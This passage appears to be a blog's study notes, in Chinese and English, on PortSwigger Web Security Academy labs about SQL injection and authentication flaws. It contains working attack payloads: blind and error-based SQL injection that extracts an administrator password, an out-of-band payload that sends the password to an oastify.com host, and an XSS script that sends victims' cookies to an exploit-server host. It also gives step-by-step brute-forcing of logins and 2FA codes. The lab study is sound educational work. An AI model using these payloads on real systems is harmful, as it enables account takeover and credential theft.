<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
<p>This condition should be true, confirming that the password is
greater than 1 character in length.</p></li>
<li><p>Send a series of follow-up values to test different password
lengths. Send:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
<p>Then send:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
<p>And so on. You can do this manually using [Burp Repeater], since the
length is likely to be short. When the condition stops being true (i.e.
when the error disappears), you have determined the length of the
password, which is in fact 20 characters long.</p></li>
<li><p>After determining the length of the password, the next step is to
test the character at each position to determine its value. This
involves a much larger number of requests, so you need to use [Burp
Intruder]. Send the request you are working on to Burp Intruder, using
the context menu.</p></li>
<li><p>In the Positions tab of Burp Intruder, change the value of the
cookie to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span>a<span class="token string">' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
<p>This uses the <code>SUBSTR()</code> function to extract a single
character from the password, and test it against a specific value. Our
attack will cycle through each position and possible value, testing each
one in turn.</p></li>
<li><p>Place payload position markers around the final <code>a</code>
character in the cookie value. To do this, select just the
<code>a</code>, and click the "Add §" button. You should then see the
following as the cookie value (note the payload position markers):</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN SUBSTR(password,1,1)='</span>§a§<span class="token string">' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span> </code></pre></li>
</ol>
<h5 id="lab-visible-error-based-sql-injection">Lab: Visible error-based
SQL injection</h5>
<ul>
<li>将字符串转换为其他类型会引发错误</li>
</ul>
<ol type="1">
<li><p>Using Burp's built-in browser, explore the lab
functionality.</p></li>
<li><p>Go to the <strong>Proxy &gt; HTTP history</strong> tab and find a
<code>GET /</code> request that contains a <code>TrackingId</code>
cookie.</p></li>
<li><p>In Repeater, append a single quote to the value of your
<code>TrackingId</code> cookie and send the request.</p>
<pre class="language-none"><code class="language-none">TrackingId&#x3D;ogAZZfxtOKUELbuJ&#39;</code></pre></li>
<li><p>In the response, notice the verbose error message. This discloses
the full SQL query, including the value of your cookie. It also explains
that you have an unclosed string literal. Observe that your injection
appears inside a single-quoted string.</p></li>
<li><p>In the request, add comment characters to comment out the rest of
the query, including the extra single-quote character that's causing the
error:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ'<span class="token comment">--</span></code></pre></li>
<li><p>Send the request. Confirm that you no longer receive an error.
This suggests that the query is now syntactically valid.</p></li>
<li><p>Adapt the query to include a generic <code>SELECT</code> subquery
and cast the returned value to an <code>int</code> data type:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
<li><p>Send the request. Observe that you now get a different error
saying that an <code>AND</code> condition must be a boolean
expression.</p></li>
<li><p>Modify the condition accordingly. For example, you can simply add
a comparison operator (<code>=</code>) as follows:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
<li><p>Send the request. Confirm that you no longer receive an error.
This suggests that this is a valid query again.</p></li>
<li><p>Adapt your generic <code>SELECT</code> statement so that it
retrieves usernames from the database:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>ogAZZfxtOKUELbuJ' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
<li><p>Observe that you receive the initial error message again. Notice
that your query now appears to be <strong>truncated due to a character
limit</strong>. As a result, the comment characters you added to fix up
the query aren't included.</p></li>
<li><p>Delete the original value of the <code>TrackingId</code> cookie
to free up some additional characters. Resend the request.</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users<span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
<li><p>Notice that you receive a new error message, which appears to be
generated by the database. This suggests that the query was run
properly, but you're still getting an error because it unexpectedly
returned more than one row.</p></li>
<li><p>Modify the query to return <strong>only one row</strong>:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> username <span class="token keyword">FROM</span> users <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
<li><p>Send the request. Observe that the error message now leaks the
first username from the <code>users</code> table:</p>
<pre class="language-none"><code class="language-none">ERROR: invalid input syntax for type integer: &quot;administrator&quot;</code></pre></li>
<li><p>Now that you know that the <code>administrator</code> is the
first user in the table, modify the query once again to leak their
password:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>' <span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> password <span class="token keyword">FROM</span> users <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token comment">--</span></code></pre></li>
</ol>
<ul>
<li>当应用程序能够正确处理数据库错误时，触发SQL查询错误不会导致应用程序响应中的任何差异，因此之前诱发条件错误的技术将无法使用。</li>
<li>延迟SQL查询的执行也会延迟HTTP响应的到达</li>
</ul>
<h5
id="lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab:
Blind SQL injection with time delays and information retrieval</h5>
<ol type="1">
<li><p>试探能否利用延迟响应</p></li>
<li><p>爆破密码长度 <strong>intruder</strong></p>
<pre class="language-sql" data-language="sql"><code class="language-sql">x<span class="token string">'%3BSELECT+CASE+WHEN+(username='</span>administrator'<span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>LENGTH<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">THEN</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">ELSE</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">END</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token comment">--</span></code></pre></li>
<li><p>爆破每个位置的字母/数字</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%3BSELECT+CASE+WHEN+(username='</span>administrator<span class="token string">'+AND+SUBSTRING(password,1,1)='</span>a'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">THEN</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">ELSE</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">END</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token comment">--</span></code></pre>
<ol type="1">
<li>两处标记</li>
<li>攻击类型：<code>cluster bomb</code><img
src="https://s2.loli.net/2023/07/17/ZEIQfR1U6zKAYi2.png"
alt="image-20230717182416228" /></li>
<li>设置2个标记
<ol type="1">
<li>1<img
src="https://s2.loli.net/2023/07/17/Sb42wQkRXALY7J8.png" /></li>
<li>2<img src="https://s2.loli.net/2023/07/17/fU5AQOPRl8BoLJq.png"
alt="image-20230717182506279" /></li>
</ol></li>
<li>操纵结果
<ol type="1">
<li>显示响应列<img
src="https://s2.loli.net/2023/07/17/WnJjRLfth7FaPHE.png"
alt="image-20230717182602320" /></li>
<li>高亮选中的响应行<img
src="https://s2.loli.net/2023/07/17/2rm5oWtR7se84wV.png"
alt="image-20230717182643205" /></li>
<li>按payload1排序</li>
</ol></li>
</ol></li>
</ol>
<h5 id="lab-blind-sql-injection-with-out-of-band-data-exfiltration">Lab:
Blind SQL injection with out-of-band data exfiltration</h5>
<ol type="1">
<li><p>替换掉这里的服务器地址<img
src="https://s2.loli.net/2023/07/18/Z6fzikxn1Ku4NRa.png"
alt="image-20230718065619069" /></p>
<p>也可右击：<img
src="https://s2.loli.net/2023/07/18/2KHSuIj7ECGZ9Qx.png"
alt="image-20230718070822589" /></p>
<p>payload:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' UNION SELECT EXTRACTVALUE(xmltype('</span><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY <span class="token operator">%</span> remote SYSTEM <span class="token string">"http://'||(SELECT password FROM users WHERE username='administrator')||'kznuf4bv5tmqp5m8sun2099zcqih6bu0.oastify.com/"</span><span class="token operator">></span> <span class="token operator">%</span>remote<span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token operator">></span></code></pre></li>
<li><p>collaborator出现交互,<img
src="https://s2.loli.net/2023/07/18/EWa3vsK9BPtgZDo.png"
alt="image-20230718071012819" /></p>
<ol type="1">
<li>红色标记，即为要查询的密码</li>
<li>如果是http请求，则查询的内容在host处</li>
</ol></li>
</ol>
<h3 id="authentication-vulnerabilities重置版">Authentication
vulnerabilities（重置版）</h3>
<h4 id="vulnerabilities-in-password-based-login">Vulnerabilities in
password-based login</h4>
<ul>
<li>different status code</li>
</ul>
<h5 id="lab-username-enumeration-via-subtly-different-responses">Lab:
Username enumeration via subtly different responses</h5>
<ol type="1">
<li>发送登录请求，得到响应</li>
<li>intruder:设置<code>Grep Extract</code>,选中invalid.....<img
src="https://s2.loli.net/2023/07/18/3oC794EdaQpPMzh.png"
alt="image-20230718100143492" />开始攻击</li>
<li>观察结果，没点<img
src="https://s2.loli.net/2023/07/18/e6bhsji9kTXI5KF.png"
alt="image-20230718100321645" /></li>
<li>用户名 intruder,结果观察状态码.</li>
</ol>
<h5 id="lab-username-enumeration-via-response-timing">Lab: Username
enumeration via response timing</h5>
<ul>
<li>Notice that <strong>your IP will be blocked</strong> if you make too
many invalid login attempts.</li>
<li>Pay particular attention to the <strong>response times</strong>.
Notice that when the username is invalid, the response time is roughly
the same. However, when you enter a valid username (your own), the
response time is increased depending on the <strong>length of the
password</strong> you entered.</li>
</ul>
<ol type="1">
<li><p><strong>X-Forwarded-For</strong>：password
设置长度足够长，以区别不对的用户名<img
src="https://s2.loli.net/2023/07/18/iK8IojuQbqMpAvG.png"
alt="image-20230718153121353" /></p>
<p>IP地址没有小数<img
src="https://s2.loli.net/2023/07/18/tLIa1hzRXA8u24e.png"
alt="image-20230718153300975" /></p></li>
<li><p>结果<img src="https://s2.loli.net/2023/07/18/F4Oo2HwhqzrPuYR.png"
alt="image-20230718153613773" /></p></li>
</ol>
<h5 id="lab-broken-brute-force-protection-ip-block">Lab: Broken
brute-force protection, IP block</h5>
<ul>
<li>封锁ip,封锁账号，在封锁前可以使用自己账号重置等待时间</li>
</ul>
<ol type="1">
<li><strong>pitchfork</strong>
<ol type="1">
<li>用户名爆破，交替形式<img
src="https://s2.loli.net/2023/07/18/YK3Z2m4QkpB7hrv.png"
alt="image-20230718161651441" /></li>
<li>密码与用户名意义对应</li>
</ol></li>
<li>结果<img src="https://s2.loli.net/2023/07/18/BTUQ6HlNFntGczd.png"
alt="image-20230718161802100" /></li>
</ol>
<h5 id="lab-username-enumeration-via-account-lock">Lab: Username
enumeration via account lock</h5>
<ul>
<li>responses from the server indicating that an account is locked can
also help an attacker to enumerate usernames.</li>
</ul>
<ol type="1">
<li>intruder
<ol type="1">
<li>position<img
src="https://s2.loli.net/2023/07/18/4aYO5dj1oiCQLgz.png"
alt="image-20230718163603865" /></li>
<li>payload2<img
src="https://s2.loli.net/2023/07/18/RnrfYvWAbhUcBI7.png"
alt="image-20230718163944629" /></li>
</ol></li>
<li>结果：Username<img
src="https://s2.loli.net/2023/07/18/F9mhKRN3QrzZdlw.png"
alt="image-20230718164921592" /></li>
<li>爆破密码，Grep Extract<img
src="https://s2.loli.net/2023/07/18/kQOqJlM8LtoA5Zc.png"
alt="image-20230718165036081" />
<ol type="1">
<li>结果<img src="https://s2.loli.net/2023/07/18/SysKYhlWAGn94Eu.png"
alt="image-20230718165147674" /></li>
</ol></li>
</ol>
<h5
id="lab-broken-brute-force-protection-multiple-credentials-per-request">Lab:
Broken brute-force protection, multiple credentials per request</h5>
<ol type="1">
<li>Json格式提交参数<img
src="https://s2.loli.net/2023/07/18/pfQFhERdq9wIBe3.png"
alt="image-20230718172602311" /></li>
</ol>
<h4 id="vulnerabilities-in-multi-factor-authentication">Vulnerabilities
in multi-factor authentication</h4>
<h5 id="lab-2fa-simple-bypass">Lab: 2FA simple bypass</h5>
<ul>
<li>登录与验证不是同一个页面</li>
</ul>
<ol type="1">
<li>首先使用wiener登录，接受验证码登录</li>
<li>换carlos账号登录，在输入验证码页面的url上换成 `mycount=wiener'
(换成上一个账号的已登录页面)</li>
<li>再刷新页面，carlos账号登录</li>
</ol>
<h5 id="lab-2fa-broken-logic">Lab: 2FA broken logic</h5>
<ul>
<li>这个真的折腾了超级久</li>
</ul>
<ol type="1">
<li>wiener 账号登录并验证</li>
<li>选择这个Get/login2请求，发送到repeater,确保验证码是给carlos<img
src="https://s2.loli.net/2023/07/19/oOSRkvi5dcn6pe1.png"
alt="image-20230719145132898" /></li>
<li>选择Post /login2请求发送到intruder，<img
src="https://s2.loli.net/2023/07/19/nB7SEYvUrmqdHOj.png"
alt="image-20230719145404941" /></li>
</ol>
<h5 id="lab-2fa-bypass-using-a-brute-force-attack">Lab: 2FA bypass using
a brute-force attack</h5>
<ol type="1">
<li><p>With Burp running, log in as <code>carlos</code> and investigate
the 2FA verification process. Notice that if you enter the wrong code
twice, you will be logged out again. You need to use Burp's session
handling features to log back in automatically before sending each
request.</p></li>
<li><p>In Burp, go to <strong>Project options &gt; Sessions</strong>. In
the <strong>Session Handling Rules</strong> panel, click
<strong>Add</strong>. The <strong>Session handling rule editor</strong>
dialog opens.</p></li>
<li><p>In the dialog, go to the <strong>Scope</strong> tab. Under
<strong>URL Scope</strong>, select the option <strong>Include all
URLs</strong>.</p></li>
<li><p>Go back to the <strong>Details</strong> tab and under
<strong>Rule Actions</strong>, click <strong>Add &gt; Run a
macro</strong>.</p></li>
<li><p>Under <strong>Select macro</strong> click <strong>Add</strong> to
open the <strong>Macro Recorder</strong>. Select the following 3
requests:</p>
<pre class="language-none"><code class="language-none">GET &#x2F;login
POST &#x2F;login
GET &#x2F;login2</code></pre>
<p>Then click <strong>OK</strong>. The <strong>Macro Editor</strong>
dialog opens.</p></li>
<li><p>Click <strong>Test macro</strong> and check that the final
response contains the page asking you to provide the 4-digit security
code. This confirms that the macro is working correctly.</p></li>
<li><p>Keep clicking <strong>OK</strong> to close the various dialogs
until you get back to the main Burp window. The macro will now
automatically log you back in as Carlos before each request is sent by
Burp Intruder.</p></li>
<li><p>Send the <code>POST /login2</code> request to Burp
Intruder.</p></li>
<li><p>In Burp Intruder, add a payload position to the
<code>mfa-code</code> parameter.</p></li>
<li><p>On the <strong>Payloads</strong> tab, select the
<strong>Numbers</strong> payload type. Enter the range 0 - 9999 and set
the step to 1. Set the min/max integer digits to 4 and max fraction
digits to 0. This will create a payload for every possible 4-digit
integer.</p></li>
<li><p>Go to the <strong>Resource pool</strong> tab and add the attack
to a resource pool with the <strong>Maximum concurrent requests</strong>
set to <code>1</code>.</p></li>
<li><p>Start the attack. Eventually, one of the requests will return a
302 status code. Right-click on this request and select <strong>Show
response in browser</strong>. Copy the URL and load it in the
browser.</p></li>
<li><p>Click <strong>My account</strong> to solve the lab.</p></li>
</ol>
<h4
id="vulnerabilities-in-other-authentication-mechanisms">Vulnerabilities
in other authentication mechanisms</h4>
<ul>
<li>除了基本的登录功能之外，大多数网站还提供了补充功能，允许用户管理他们的账户。例如，用户通常可以更改密码或在忘记密码时进行密码重置。然而，这些机制也可能引入漏洞，被攻击者利用<br />
</li>
<li>然而，有些网站根据可预测的静态值（例如用户名和时间戳）拼接生成这个Cookie。有些甚至将密码作为Cookie的一部分。如果攻击者能够创建自己的账户，这种方法就特别危险，因为他们可以研究自己的Cookie，并且有可能推断出它是如何生成的。一旦他们找出这个规则，他们可以尝试对其他用户的Cookie进行暴力破解，从而获得对其账户的访问权限。
<ul>
<li>但是简单地使用Base64等两向编码对Cookie进行"加密"是毫无保护作用的。即使使用正确的加密和单向哈希函数，也并非完全可靠。如果攻击者能够轻易识别哈希算法并且没有使用盐（salt），他们可以通过简单地对他们的字典进行哈希运算来暴力破解Cookie</li>
</ul></li>
</ul>
<h5 id="lab-brute-forcing-a-stay-logged-in-cookie">Lab: Brute-forcing a
stay-logged-in cookie</h5>
<ol type="1">
<li><p>stay-logged-in<img
src="https://s2.loli.net/2023/07/29/zrutHQ2Th97sj4q.png"
alt="image-20230729174848714" /></p>
<p>用户名后面一串极有可能是密码的hash值</p></li>
<li><p>intruder:stay-logged-in。注意carlos后面的<strong>冒号</strong><img
src="https://s2.loli.net/2023/07/20/9wFEbWnJf72xmrv.png"
alt="image-20230720131918684" /></p></li>
</ol>
<h5 id="lab-offline-password-cracking">Lab: Offline password
cracking</h5>
<ul>
<li>https://crackstation.net/</li>
</ul>
<ol type="1">
<li><p>stay-logged-in cookie构成</p></li>
<li><p>存储型xss攻击</p>
<ol type="1">
<li><p>复制服务器地址<img
src="https://s2.loli.net/2023/07/20/L384FKb2rjmAtdz.png"
alt="image-20230720135144415" /></p></li>
<li><p>评论区插入脚本</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>查看access log<img
src="https://s2.loli.net/2023/07/20/FfGs7ZpPAgcHSjv.png"
alt="image-20230720135328815" /></p></li>
</ol></li>
</ol>
<h5 id="lab-password-reset-broken-logic">Lab: Password reset broken
logic</h5>
<ul>
<li>重置密码时并不检查身份，因此可以修改任意用户的密码</li>
</ul>
<ol type="1">
<li>token 可有可无<img
src="https://s2.loli.net/2023/07/20/1bw79zlD2WhjNvt.png"
alt="image-20230720142657091" /></li>
</ol>
<h5 id="lab-password-reset-poisoning-via-middleware">Lab: Password reset
poisoning via middleware</h5>
<ul>
<li>X-Forwarded-Host</li>
</ul>
<ol type="1">
<li>X-Forwarded-Host是一个请求头。它可以用来欺骗请求的主机域名。这里将其设置为攻击者的exploit
server域名。这样重置密码的链接将指向攻击者域名。因为目标应用信任并生效了这个头。<img
src="https://s2.loli.net/2023/07/20/RkwtA42HsWZdP6c.png"
alt="image-20230720150240028" /></li>
<li>查看日志，获得temp-forgot-password-token</li>
<li>最后<img src="https://s2.loli.net/2023/07/20/oJlA3NYhj2cbvRg.png"
alt="image-20230720150335692" /></li>
</ol>
<h5 id="lab-password-brute-force-via-password-change">Lab: Password
brute-force via password change</h5>
<ul>
<li>注意观察当你输入错误的当前密码时的行为。如果两次输入的新密码不匹配，会将账户锁定。然而，如果你输入了一个有效的当前密码，但两个新密码不匹配，系统只会显示错误信息
"Current password is incorrect" 或 "New passwords do not match"</li>
</ul>
<ol type="1">
<li>intruder<img
src="https://s2.loli.net/2023/07/20/ouWQxyP8lF1cnXC.png"
alt="image-20230720153825146" /></li>
<li>匹配的信息不能多或者少<img
src="https://s2.loli.net/2023/07/20/KxDYyjcabiLeCIV.png"
alt="image-20230720153919492" /></li>
</ol>
<h3 id="authentication-vulnerabilities">Authentication
vulnerabilities</h3>
<h5 id="lab-username-enumeration-via-different-responses">Lab: Username
enumeration via different responses</h5>
<ul>
<li>先爆破username</li>
<li>再是password</li>
</ul>
<h4 id="vulnerabilities-in-password-based-login-1">Vulnerabilities in
password-based login</h4>
<ul>
<li><strong>key words:</strong>
account(username;password;broute-force)</li>
<li>catagory<img
src="https://s2.loli.net/2023/03/19/qXLsBSpxOG8TaZl.png" /></li>
</ul>
<h5 id="flawed-brute-force-protection">Flawed brute-force
protection</h5>
<ul>
<li><p>Locking the account that the remote user is trying to access if
they make too many failed login attempts</p></li>
<li><p>Blocking the remote user's IP address if they make too many login
attempts in quick succession</p></li>
<li><p><strong>Lab:</strong> Broken brute-force protection, IP block</p>
<blockquote>
<ul>
<li>使用一个有效的账号重置自己的IP</li>
<li>pitchfork选项的使用</li>
<li>有效的账号:payload-step设置为2</li>
</ul>
</blockquote></li>
<li><p><strong>Lab:</strong> Username enumeration via account lock</p>
<ul>
<li><p>attack type<img
src="https://s2.loli.net/2023/03/19/1maM9vbRZn5Yg2I.png"
alt="image-20230319084859128" /></p>
<blockquote>
<ul>
<li>grep extract：使用“grep
extract”可以从HTTP响应中提取与指定正则表达式匹配的文本。</li>
<li>Add a blank payload position to the end of the request body by
clicking Add § twice. The result should look something like this:
<code>username=§invalid-username§&amp;password=example§§</code>
<ul>
<li>select the Null payloads type and choose the option to generate 5
payloads.</li>
</ul></li>
</ul>
</blockquote></li>
</ul></li>
</ul>
<h4
id="vulnerabilities-in-multi-factor-authentication-1">Vulnerabilities in
multi-factor authentication</h4>
<ul>
<li><p><strong>Lab:</strong> 2FA simple bypass</p>
<blockquote>
<ul>
<li>一个http请求中，Json中写入多个密码</li>
</ul>
</blockquote></li>
<li><p>Flawed two-factor verification logic</p>
<blockquote>
<ul>
<li>the website doesn't adequately verify that the same user is
completing the second step.</li>
</ul>
</blockquote>
<ul>
<li><p>for detail</p>
<p>第一步验证通过之后才会有第二步验证</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>first</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span>
...
username=carlos&amp;password=qwerty</code></pre>
<p>分配cookie</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK Set-Cookie: account=carlos  </span></span>
<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=carlos</span></span></code></pre>
<p>提交验证码</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span> 
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com </span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=carlos ...</span></span>
verification-code=123456</code></pre>
<p>使用自己的cookie凭证，但是<strong>用户名</strong>可以任意</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=victim-user</span></span>
...
verification-code=123456</code></pre></li>
<li><p><strong>lab:</strong>2FA broken logic</p></li>
<li><p><strong>lab:</strong>Brute-forcing 2FA verification code</p>
<p><strong>原理：</strong></p>
<p>为了实现自动登录功能，攻击者可以使用Burp Suite的Session
Handling功能。这个功能可以记录登录过程中的请求（GET /login, POST /login,
GET /login2），并将它们设置为Session Handling规则。然后，Burp
Suite会在每次发送请求之前自动执行这些请求，以保持登录状态。</p>
<p>这样攻击者就可以在每次尝试暴力破解2FA代码之前自动登录系统，从而避免被系统自动注销。</p>
<blockquote>
<ul>
<li>GET /login：获取登录页面的HTML代码。</li>
<li>POST /login：向服务器提交用户名和密码，获取用户会话令牌。</li>
<li>GET /login2：获取带有2FA验证码输入框的页面。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>输入有效的账号登录</li>
<li>输入两次错误的验证码</li>
</ul>
</blockquote>
<p><strong>设置宏:</strong><img
src="https://s2.loli.net/2023/03/20/ZTsdpRC9xn14UoH.png"
alt="image-20230320020110029" /></p>
<p>选中这三个<img
src="https://s2.loli.net/2023/03/20/nN3R8GEsKIBu6Ua.png"
alt="image-20230320020827664" /></p>
<figure>
<img src="https://s2.loli.net/2023/03/20/bSCpWjIitnRHX2a.png"
alt="image-20230320020615567" />
<figcaption aria-hidden="true">image-20230320020615567</figcaption>
</figure>
<figure>
<img src="https://s2.loli.net/2023/03/20/aGTqRiE9g82CPzu.png"
alt="image-20230320020959373" />
<figcaption aria-hidden="true">image-20230320020959373</figcaption>
</figure>
<p><strong>result</strong><img
src="https://s2.loli.net/2023/03/20/mvGYfUVQ8FziB3N.png"
alt="image-20230320021056987" /></p></li>
</ul></li>
</ul>
<h4
id="vulnerabilities-in-other-authentication-mechanisms-1">Vulnerabilities
in other authentication mechanisms</h4>
<ul>
<li><p><strong>要点</strong>：风险</p>
<p>密码重置</p>
<p>登录记住密码（保持登录状态）</p>
<ul>
<li><p><strong>Lab: Brute-forcing a stay-logged-in cookie</strong>:</p>
<ul>
<li><p>利用<code>proxy-history</code></p></li>
<li><p>保持登录-&gt;logout</p></li>
<li><p><strong>分析stay-logged-in cookie 生成规则</strong></p>
<figure>
<img src="https://s2.loli.net/2023/03/26/cxF9Jn4zhevsrtI.png"
alt="image-20230326074023169" />
<figcaption aria-hidden="true">image-20230326074023169</figcaption>
</figure></li>
<li><p><strong>intruder设置</strong></p>
<p>需要将cookie中自己的用户名更改为要hack的用户名</p>
<figure>
<img src="https://s2.loli.net/2023/03/26/UhWTZ3DK86frQOc.png"
alt="image-20230326075242818" />
<figcaption aria-hidden="true">image-20230326075242818</figcaption>
</figure>
<figure>
<img src="https://s2.loli.net/2023/03/26/yqkthGoKQvbwHj7.png"
alt="image-20230326075454030" />
<figcaption aria-hidden="true">image-20230326075454030</figcaption>
</figure></li>
</ul></li>
<li><p><strong>Lab: Offline password cracking</strong></p>
<ol type="1">
<li><p>跟前面实验类似：先登录自己账户-》研究<strong>stay-login-in</strong>:cookie</p>
<ol start="2" type="1">
<li><p>发现stay-login-in构成：用户名+密码（md5编码）</p></li>
<li><p>因此设法获取对方stay-login-in,此处利用评论区的xss漏洞</p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1.</span> <span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
